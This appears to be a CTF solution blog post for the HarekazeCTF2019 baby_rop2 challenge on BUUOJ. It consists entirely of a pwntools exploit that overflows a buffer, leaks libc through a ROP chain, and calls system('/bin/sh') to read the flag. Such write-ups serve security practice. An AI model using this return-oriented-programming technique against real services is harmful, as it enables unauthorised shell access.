+++
title = "exp"
date = "2026-01-14"
type = "post"
categories = ['BUU']
tags = ['第一页', 'HarekazeCTF2019baby_rop2']
draft = false
+++
```python
from pwn import *  
from LibcSearcher import LibcSearcher  
context(arch='amd64', os='linux', log_level='debug')  
  
io = connect('node5.buuoj.cn', 27678)    
  
offset = 40  
main_addr = 0x0000000000400636  
ret_addr = 0x00000000004004d1  
rdi_addr = 0x0000000000400733  
  
elf = ELF("./babyrop2")  
read_got = elf.got['read']  
printf_plt = elf.plt['printf']  
  
libc = ELF("./libc.so.6")  
  
io.recvuntil(b'What\'s your name? ')  
payload = b'a' * offset + p64(ret_addr) + p64(rdi_addr) + p64(read_got) + p64(printf_plt) + p64(main_addr)  
io.sendline(payload)  
  
io.recvline()  
read_addr = u64(io.recvuntil(b'W')[:-1].ljust(8, b'\x00'))  
print(hex(read_addr))  
libc = LibcSearcher("read", read_addr)  
libc_base = read_addr - libc.dump('read')  
system_addr = libc_base + libc.dump('system')  
bin_sh_addr = libc_base + libc.dump('str_bin_sh')  
print(hex(libc_base))  
print(hex(bin_sh_addr))  
print(hex(system_addr))  
  
io.recvuntil(b'name? ')  
payload = b'a' * offset + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)  
io.sendline(payload)  
io.sendline(b'ls')  
io.sendline(b'cd home')  
io.sendline(b'ls')  
io.sendline(b'cd babyrop2')  
io.sendline(b'ls')  
io.sendline(b'cat flag')  
io.interactive()
```
